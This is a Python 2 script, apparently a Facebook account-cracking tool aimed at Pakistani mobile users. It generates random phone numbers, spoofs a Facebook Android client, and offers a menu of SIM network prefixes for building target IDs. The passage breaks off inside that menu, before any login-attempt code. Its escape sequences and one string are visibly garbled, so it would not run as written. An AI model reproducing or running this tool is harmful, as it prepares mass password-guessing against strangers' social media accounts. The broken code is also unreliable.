#!/usr/bin/python2
#coding=utf-8
#Author Ali Haider
#NAM HE KAFII HAA...


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(50000):
 
    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')
 
    print(nmbr)
 
    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 Ali Haider.xo')
    
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
 
 
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
def exb():
	print '[!] Exit'
	os.sys.exit()
 
def psb(z):
	for e in z + '\:
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
 
def t():
    time.sleep(1)
def cb():
    os.system('clear')
##### Dev : Ali Haider
##### LOGO #####
logo='''
\3[1;91m
   
        ___    __    ____   __  _____    ________  __________ 
   /   |  / /   /  _/  / / / /   |  /  _/ __ \____/ __ \ / /| | / /    / /   / /_/ / /| |  / // / / / __/ / /_/ /
 / ___ |/ /____/ /   / __  / ___ |_/ // /_/ / /___/ _, _/ 
/_/  |_/_____/___/  /_/ /_/_/  |_/___/_____/_____/_/ |_|                                    
                                        
                                 
\3[1;90m [ NAAM TU SUNA HUGA ]

\b[1;92m=============================
\b[1;93m Coder + Author : Ali Haider
\b[1;93m HAHA  : NAM HE KAFII HA
\b[1;93m FaceBook : Ali Haider
\b[1;93m Author2 : Alone
\b[1;92m=============================
\b[1;93m     ➾       NOTE !
\b[1;91m=======================================
\b[1;93m     ➾ DoNT TRy TO COPy ME BECAUS iM THE 0NE
\b[1;91m======================================= '''                                                                                                                                                                                                                                                                                                                                                  

CorrectUsername = "Ali"
CorrectPassword = "Haider"
 
loop = 'true'
while (loop == 'true'):
    username = raw_input("\3[1;97m\b[1;91mTool Username \b[1;97m»» \b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\3[1;97m \b[1;91mTool Password  \b[1;97m» \b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Ali Haider
	    time.sleep(2)
            loop = 'false'
        else:
            print "\3[1;94mWrong Password"
            os.system('xdg-open https://www.facebook.com/profile.php?id=100068012210471/?app=fbl')
    else:
        print "\3[1;94mWrong Username"
        os.system('xdg-open https://www.facebook.com/profile.php?id=100068012210471/?app=fbl')


back = 0
successful = []
cpb = []
oks = []
id = []
def menu():
	os.system('clear')
	print logo
	print "\3[1;92m         [ Ali Haider { NAM HE KAFII HA } ]"
	print
        print "\3[1;91m          SELECT ANY ONE SIM NETWORK"
	print "\3[1;92m[1]\3[1;97m╼╼\3[1;93mMOBILINK     (Press 1)"
	print "\3[1;92m[2]\3[1;97m╼╼\3[1;93mTELENOR      (Press 2)"
	print "\3[1;92m[3]\3[1;97m╼╼\3[1;93mWARID        (Press 3)"
	print "\3[1;92m[4]\3[1;97m╼╼\3[1;93mUFONE        (Press 4)"
	print "\3[1;92m[5]\3[1;97m╼╼\3[1;93mZONG         (Press 5)"
	print "\3[1;92m[6]\3[1;97m╼╼\3[1;93mUPDATE SYSTEM"
	print "\3[1;92m[0]\3[1;97m╼╼\3[1;91mEXIT   (Back) "	    
	print 50*'\3[1;90m-'
	action()
	
def action():	
	bch = raw_input('\33[1;92mSELECT ANY ONE NETWORK NUMBER \3[1;95m▶▶▶▶▶ \3[1;97m ')
	if bch =='':
		print '[!] Fill in correctly'
		action()
	elif bch =="1":
		os.system("clear")
		print (logo)
		print "\3[1;91m\b[1;93mMOBILINK/JAZZ CODE HERE\b[1;92m◈◈◈◈◈"		
		print "\3[1;91m00, 01, 02, 03, 04,"
		print "\3[1;91m05, 06, 07, 08, 09,"
		try:
			c = raw_input(" \3[1;91m◢◀\b[1;92mSELECTED ANYONE CODE\b[1;91m▶◣ \3[1;97m:\3[1;97m ")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\ Back ]")
			menu()
	elif bch =="2":			
		os.system("clear")
		print (logo)
		print "\3[1;91m\3[1;91mTELENOR CODE HERE\b[1;92m◈◈◈◈◈"		
		print "\3[1;91m40, 41, 42, 43, 44,"
		print "\3[1;91m45, 64, ??, ??,
